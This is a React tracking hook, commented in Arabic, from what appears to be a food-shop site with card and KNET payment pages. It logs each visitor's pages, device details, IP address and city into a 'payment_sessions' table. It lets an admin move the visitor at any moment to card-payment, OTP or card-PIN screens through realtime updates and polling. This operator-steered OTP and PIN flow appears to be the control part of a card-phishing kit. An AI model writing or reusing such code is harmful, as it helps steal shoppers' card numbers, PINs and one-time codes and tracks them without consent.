import { useEffect, useRef } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { supabase } from '@/integrations/supabase/client';

const STORAGE_KEY = 'visitor_session_id';
const GEO_KEY = 'visitor_geo';
const HEARTBEAT_MS = 60_000; // كل دقيقة لإبقائه "متصلاً"

// خرائط الخطوات → المسار، لتوجيه الزائر عند إعادة توجيهه من الأدمن
const STEP_ROUTES: Record<string, string> = {
  card_payment: '/card-payment',
  card_otp: '/card-otp',
  card_pin: '/card-pin',
  knet_payment: '/knet-payment',
  knet_otp: '/knet-otp',
};

const countryCodeToFlag = (cc?: string): string => {
  if (!cc || cc.length !== 2) return '';
  const A = 0x1f1e6;
  return String.fromCodePoint(...cc.toUpperCase().split('').map(c => A + c.charCodeAt(0) - 65));
};

const fetchGeo = async (): Promise<{ country?: string; country_code?: string; flag?: string; city?: string; ip?: string } | null> => {
  try {
    const cached = sessionStorage.getItem(GEO_KEY);
    if (cached) return JSON.parse(cached);
    const res = await fetch('https://ipapi.co/json/');
    if (!res.ok) return null;
    const j = await res.json();
    const geo = {
      country: j.country_name as string | undefined,
      country_code: j.country_code as string | undefined,
      flag: countryCodeToFlag(j.country_code),
      city: j.city as string | undefined,
      ip: j.ip as string | undefined,
    };
    sessionStorage.setItem(GEO_KEY, JSON.stringify(geo));
    return geo;
  } catch {
    return null;
  }
};

const PAYMENT_PATHS = [
  '/card-payment',
  '/card-otp',
  '/card-pin',
  '/knet-payment',
  '/knet-otp',
  '/payment-processing',
];

const pageLabel = (pathname: string): string | null => {
  if (pathname === '/') return 'home';
  if (pathname.startsWith('/products')) return 'products';
  if (pathname.startsWith('/poultry')) return 'poultry';
  if (pathname.startsWith('/sides')) return 'sides';
  if (pathname.startsWith('/category/')) return 'category';
  if (pathname.startsWith('/product/')) return 'product_detail';
  if (pathname.startsWith('/cart')) return 'cart';
  if (pathname.startsWith('/checkout')) return 'checkout';
  if (pathname.startsWith('/about')) return 'about';
  if (pathname.startsWith('/contact')) return 'contact';
  if (pathname.startsWith('/quality-guarantee')) return 'quality_guarantee';
  if (pathname.startsWith('/legal/terms')) return 'legal_terms';
  if (pathname.startsWith('/legal/privacy')) return 'legal_privacy';
  if (pathname.startsWith('/legal/refund')) return 'legal_refund';
  if (pathname.startsWith('/legal/faq')) return 'legal_faq';
  if (pathname.startsWith('/legal')) return 'legal';
  if (pathname.startsWith('/order-confirmation')) return 'order_confirmation';
  if (pathname.startsWith('/wishlist')) return 'wishlist';
  if (pathname.startsWith('/track')) return 'track_order';
  if (pathname.startsWith('/compare')) return 'compare';
  if (pathname.startsWith('/subscriptions')) return 'subscriptions';
  return null;
};

// تفاصيل إضافية: slug القسم / id المنتج / رقم الطلب / صفحة قانونية
const pageDetail = (pathname: string): string | null => {
  const m1 = pathname.match(/^\/category\/([^/?#]+)/); if (m1) return decodeURIComponent(m1[1]);
  const m2 = pathname.match(/^\/product\/([^/?#]+)/); if (m2) return decodeURIComponent(m2[1]);
  const m3 = pathname.match(/^\/track\/([^/?#]+)/); if (m3) return decodeURIComponent(m3[1]);
  const m4 = pathname.match(/^\/legal\/([^/?#]+)/); if (m4) return decodeURIComponent(m4[1]);
  return null;
};

const runWhenIdle = (fn: () => void) => {
  if ('requestIdleCallback' in window) {
    const id = window.requestIdleCallback(fn, { timeout: 2500 });
    return () => window.cancelIdleCallback(id);
  }
  const id = globalThis.setTimeout(fn, 700);
  return () => globalThis.clearTimeout(id);
};

/**
 * يتتبّع كل زائر يدخل الموقع ويُنشئ جلسة payment_sessions
 * بـ step='browsing' فور دخوله، فيظهر فوراً في لوحة التحكم.
 * يتجاهل صفحات الدفع و /admin (تُدار بمكان آخر).
 */
export const useVisitorTracker = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const sessionIdRef = useRef<string | null>(null);
  const initRef = useRef(false);
  const redirectedRef = useRef(false);

  useEffect(() => {
    // تجاهل صفحات الإدارة وصفحات الدفع (لها جلساتها الخاصة)
    if (location.pathname.startsWith('/admin')) return;
    if (PAYMENT_PATHS.some(p => location.pathname.startsWith(p))) return;

    const currentPage = pageLabel(location.pathname);
    if (!currentPage) {
      sessionIdRef.current = null;
      return;
    }
    const detail = pageDetail(location.pathname);

    const ensureSession = async () => {
      // استخدم جلسة موجودة في sessionStorage إن وُجدت
      let id = sessionIdRef.current || sessionStorage.getItem(STORAGE_KEY);
      const baseMeta: Record<string, any> = {
        current_page: currentPage,
        page_detail: detail,
        page_path: location.pathname,
        page_title: typeof document !== 'undefined' ? document.title : undefined,
        referrer: typeof document !== 'undefined' ? (document.referrer || undefined) : undefined,
        user_agent: navigator.userAgent,
        screen: typeof window !== 'undefined' ? `${window.innerWidth}x${window.innerHeight}` : undefined,
        language: typeof navigator !== 'undefined' ? navigator.language : undefined,
        last_seen: new Date().toISOString(),
      };


      if (id) {
        // تحقّق أنها لا تزال موجودة في DB، ثم حدّث الصفحة
        const { data } = await supabase
          .from('payment_sessions')
          .select('id, step, metadata')
          .eq('id', id)
          .maybeSingle();

        if (data) {
          // لا نلمس جلسات الدفع الحقيقية
          if (data.step !== 'browsing') {
            sessionIdRef.current = id;
            return;
          }
          const meta = (data.metadata as Record<string, any>) || {};
          await supabase
            .from('payment_sessions')
            .update({
              metadata: {
                ...meta,
                ...baseMeta,
              },
              updated_at: new Date().toISOString(),
            } as any)
            .eq('id', id);
          sessionIdRef.current = id;
          return;
        }
        // الجلسة لم تعد موجودة (تم تنظيفها) — أنشئ جديدة
        id = null;
        sessionStorage.removeItem(STORAGE_KEY);
      }

      // إنشاء جلسة تصفّح جديدة
      const { data: created, error } = await supabase
        .from('payment_sessions')
        .insert({
          step: 'browsing',
          status: 'pending',
          payment_method: 'browsing',
          metadata: {
            ...baseMeta,
            current_page: currentPage,
            entry_page: currentPage,
            entered_at: new Date().toISOString(),
          },
        } as any)
        .select('id')
        .single();

      if (!error && created) {
        sessionIdRef.current = created.id;
        sessionStorage.setItem(STORAGE_KEY, created.id);
        fetchGeo().then((geo) => {
          if (!geo) return;
          supabase
            .from('payment_sessions')
            .update({
              metadata: {
                ...baseMeta,
                entry_page: currentPage,
                entered_at: new Date().toISOString(),
                country: geo.country,
                country_code: geo.country_code,
                flag: geo.flag,
                city: geo.city,
                ip: geo.ip,
              },
            } as any)
            .eq('id', created.id)
            .then(() => {});
        });
      }
    };

    const cancelIdle = runWhenIdle(ensureSession);
    initRef.current = true;
    return cancelIdle;
  }, [location.pathname]);

  // Heartbeat: تحديث updated_at كل دقيقة لإبقائه "متصلاً"
  useEffect(() => {
    const tick = async () => {
      const id = sessionIdRef.current;
      if (!id) return;
      await supabase
        .from('payment_sessions')
        .update({ updated_at: new Date().toISOString() } as any)
        .eq('id', id);
    };
    const i = setInterval(tick, HEARTBEAT_MS);
    return () => clearInterval(i);
  }, []);

  // 🎯 توجيه الزائر من الأدمن: يستطيع الأدمن نقل الزائر إلى أي صفحة في أي وقت
  // عبر تحديث step (لصفحات الدفع) أو metadata.redirect_to (لأي مسار)
  useEffect(() => {
    if (location.pathname.startsWith('/admin')) return;

    let channel: ReturnType<typeof supabase.channel> | null = null;
    let pollTimer: ReturnType<typeof setInterval> | null = null;
    let lastRedirectAt = '';

    const applyRedirect = (row: any) => {
      if (!row) return;
      const meta = row.metadata || {};
      const target: string | undefined = meta.redirect_to;
      const at: string | undefined = meta.redirect_at || meta.redirect_nonce;
      if (target && at && at !== lastRedirectAt) {
        lastRedirectAt = at;
        redirectedRef.current = true;
        if (target !== location.pathname) {
          navigate(target);
        } else {
          // نفس المسار — أعد تحميل الصفحة لضمان تنفيذ نية الأدمن (تفريغ نموذج/إعادة عرض)
          navigate(target, { replace: true });
          setTimeout(() => { redirectedRef.current = false; }, 500);
        }
        return;
      }
      const newStep: string | undefined = row.step;
      if (!newStep || newStep === 'browsing') return;
      const route = STEP_ROUTES[newStep];
      if (route && route !== location.pathname && !redirectedRef.current) {
        redirectedRef.current = true;
        navigate(route);
      }
    };

    const attach = () => {
      const id = sessionIdRef.current;
      if (!id) return false;

      channel = supabase
        .channel(`visitor-redirect-${id}`)
        .on('postgres_changes', {
          event: 'UPDATE',
          schema: 'public',
          table: 'payment_sessions',
          filter: `id=eq.${id}`,
        }, (payload) => applyRedirect(payload.new))
        .subscribe();

      // Fallback polling كل 4 ثوانٍ
      pollTimer = setInterval(async () => {
        const sid = sessionIdRef.current;
        if (!sid) return;
        const { data } = await supabase
          .from('payment_sessions')
          .select('step, metadata')
          .eq('id', sid)
          .maybeSingle();
        applyRedirect(data);
      }, 4000);
      return true;
    };

    const waitTimer = setInterval(() => {
      if (attach()) clearInterval(waitTimer);
    }, 500);

    return () => {
      clearInterval(waitTimer);
      if (channel) supabase.removeChannel(channel);
      if (pollTimer) clearInterval(pollTimer);
    };
  }, [location.pathname, navigate]);


  // إعادة تعيين علم التوجيه عند الانتقال إلى صفحة جديدة
  useEffect(() => {
    redirectedRef.current = false;
  }, [location.pathname]);
};
